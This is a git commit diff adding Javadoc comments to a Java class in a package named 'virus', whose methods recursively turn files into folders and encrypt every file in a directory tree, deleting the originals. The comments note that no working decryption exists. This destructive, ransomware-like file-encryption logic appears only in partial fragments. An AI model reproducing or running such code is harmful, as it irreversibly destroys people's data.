cb3cc3beef27f2fd298df61c9999dc774e0d9822
Marco Velluto <marco.velluto@csttech.it>
2016-05-25 09:52:20 +0200

    add comment

--- src/it/reexon/lib/virus/FileManipulations.java
+++ src/it/reexon/lib/virus/FileManipulations.java
@@ -22,6 +22,14 @@ public class FileManipulations
 {
     private static final Logger logger = LogManager.getLogger(FileManipulations.class);
 
+    /**
+     * @WARNING This operation is irreversible.
+     * 
+     * Turns every file in the folder passed as a parameter to a folder.
+     * It will do the same thing for each subfolder of the specified routing
+     * 
+     * @param file      It can be a folder or a file.
+     */
     public static void fileToFolder(File file)
     {
         if (file.isFile())
@@ -45,13 +53,21 @@ public class FileManipulations
         }
     }
 
+    /**
+     * @WARNING This method still does not have a correct decoding method. So the operation is irreversible.
+     * 
+     * It encrypts each file in the folder and subfolders of the passed parameter.
+     * The new encrypted files will have a ".encrypted" extension. The files are not encrypted will be deleted.
+     * 
+     * @param file      It can be a folder or a file.
+     */
     public static void fileEncrypted(File file)
     {
         if (file.isFile())
         {
             try
             {
-                File outFile = new File(file.getAbsolutePath() + ".crypted");
+                File outFile = new File(file.getAbsolutePath() + ".encrypted");
                 outFile.createNewFile();
                 CryptoUtils.encrypt(file, outFile);
                 logger.debug("File Encrypted: {}", file.getAbsolutePath());
@@ -69,6 +85,14 @@ public class FileManipulations
         }
     }
 
+    /**
+     * @WARNING QThis method still does not properly decrypts encrypted files.
+     * 
+     * Decrypts each file in the folder and subfolders of the passed parameter.
+     * The new decrypted files will not have the extension ".encrypted". Encrypted files will be deleted.
+     * 
+     * @param file      It can be a folder or a file.
+     */
     public static void fileDecrypted(File file)
     {
         if (file.isFile())
